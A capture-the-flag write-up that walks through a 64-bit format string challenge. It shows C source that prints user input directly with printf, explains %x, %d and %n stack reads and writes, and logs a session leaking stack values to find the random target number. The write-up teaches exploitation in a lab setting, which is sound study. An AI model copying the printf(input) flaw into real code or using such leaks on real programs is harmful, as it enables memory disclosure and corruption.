Let's take a look at the source code...

```
#include <stdio.h>
#include <stdlib.h>

int main()
{
    srand(time(NULL));
    char input1[20];
    char input2[5];
    int f;
    int c = 0;
    f = rand() % 100 + 1;
    
    printf("We finally patched that pesky buffer overflow vulnerabillity.\n");
    fgets(input1, sizeof(input1), stdin);
    printf(input1);
    printf("So now you can do your favorite thing in the world!\n");
    fgets(input2, sizeof(input2), stdin);
    c = atoi(input2);
    if(c == f)
    {
       	printf("If you keep on going, we will have to cancel the celebration. Level Cleared\n");	
    }

   else
   {
	printf("You must really love to research.\n");
   }
}
```

So we can see here there are two vulnerabillities. The first one is that it uses tine as a seed for the random function, so we can generate the same seed and thus the same sequence of random numbers (however we will save exploiting that for a later challenge). The second exploit is a format string exploit where it inputs user defined data, then prints it out without formatting it. Because of this, we can insert our on flags such as "%x" to read stack values as hex, "%d" to read off stack values as a decimal, or "%n" to actually write to stack values. 

Looking at this program, we see that in order to pass the level we will have to set c equal to f. We control the value of c, so we just need to find out what the value of f is. We know that f will be a random (not really) integer between 1 and 100. We can just read off stack values untill we see an integer withing that range, that changes it's value every time the program is run but remains in that range using the string format exploit. Then we can just input it into c, then it should work. We will have to keep in mind that we can only input 20 characters at a time because of the secure fgets call, so we can only look at 3 stack values at a time. Let's try it.

```
guyinatuxedo@tux:/Hackery/escape/fmt_str/f0_64$ ./f0_64 
We finally patched that pesky buffer overflow vulnerabillity.
%1$d.%2$d.%3$d
6300719.-136497264.623797284
So now you can do your favorite thing in the world!
rgqwe
You must really love to research.
guyinatuxedo@tux:/Hackery/escape/fmt_str/f0_64$ ./f0_64 
We finally patched that pesky buffer overflow vulnerabillity.
%4$d.%5$d.%6$d
6300719.-134379776.0
So now you can do your favorite thing in the world!
frgarrqwgw
You must really love to research.
guyinatuxedo@tux:/Hackery/escape/fmt_str/f0_64$ ./f0_64 
We finally patched that pesky buffer overflow vulnerabillity.
%7$d.%8$d.%9$d
0.1680095013.958738020
So now you can do your favorite thing in the world!
rqt4ewq
You must really love to research.
guyinatuxedo@tux:/Hackery/escape/fmt_str/f0_64$ ./f0_64 
We finally patched that pesky buffer overflow vulnerabillity.
%10$d.%11$d.%12$d
-16774556.86.4196320
So now you can do your favorite thing in the world!
86
If you keep on going, we will have to cancel the celebration. Level Cleared
```

As you can see, the whole process was pretty identical to the 32 bit version. And just like that, we pwned the binary.

